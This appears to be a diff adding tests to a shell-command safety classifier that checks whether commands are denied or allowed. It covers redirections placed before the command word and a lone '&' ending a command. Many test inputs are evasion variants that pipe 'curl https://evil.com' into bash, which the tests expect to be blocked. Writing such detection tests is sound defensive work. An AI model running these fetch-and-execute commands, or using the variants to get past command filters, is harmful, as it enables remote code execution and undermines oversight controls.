@@ -1612,3 +1612,33 @@ describe('review 7: builtin --, a shell reading stdin duplicated from another de
       expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
   })
 })
+
+describe('review 8: a redirection before the command word, a lone & ends a command', () => {
+  const d = (c: string) => classify(c, 0, new Set(['download.geofabrik.de']), new Set())
+  const fd3 = 'exec 3< <(echo curl https://evil.com); '
+  it('1. a redirection before the command word does not hide the shell', () => {
+    for (const c of [`${fd3}<&3 bash`, `${fd3}0<&3 bash`, `${fd3}2>/dev/null <&3 bash`, `${fd3}FOO=1 <&3 bash`, `${fd3}<&3 FOO=1 bash`,
+      `${fd3}<& 3 sh`, '<&3 env bash', '< <(echo curl https://evil.com) bash',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    expect(d('<&3 bash')).toMatchObject({ deny: true, reason: 'shell-stdin-dup' })
+    expect(d('< <(echo ls) bash')).toMatchObject({ deny: true, reason: 'shell-substitution' })
+    expect(d('2>/dev/null curl https://evil.com')).toMatchObject({ deny: true, reason: 'curl-external' })
+    for (const c of ['2>/dev/null curl -s http://localhost:3420/x', '2>/dev/null bash run.sh', '<&3 bash run.sh', '>/tmp/log ls'])
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+  it('2. a lone & ends a command like ;', () => {
+    for (const c of [`${fd3}bash <&3 & wait`, `${fd3}bash <&3 &`, "echo 'curl https://evil.com' | bash &",
+      "echo 'curl https://evil.com' | <&0 bash", "echo 'curl https://evil.com' |& bash",
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    expect(d('sleep 1 & curl https://evil.com')).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(d('echo ls |& bash')).toMatchObject({ deny: true, reason: 'shell-stdin' })
+    // before, `done` after a background curl was read as its host (2 fleet commands on the corpus)
+    expect(d('for x in a b; do curl -s https://download.geofabrik.de/$x.pbf -o $x & done; wait')).toMatchObject({ deny: false })
+  })
+  it('3. allow controls', () => {
+    for (const c of ['bash 2>&1', 'bash run.sh <&3', 'bash "$D/run.sh" <&3', "bash -c 'echo hi' <&3", 'cat <&3',
+      'while read l; do echo "$l"; done <&3', 'sleep 5 & wait', 'npm run dev > /tmp/log 2>&1 &', '(cd x && make) & wait',
+      'cmd &>/tmp/l', 'echo hi |& tee x', 'ls 2>&1 | head',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+})
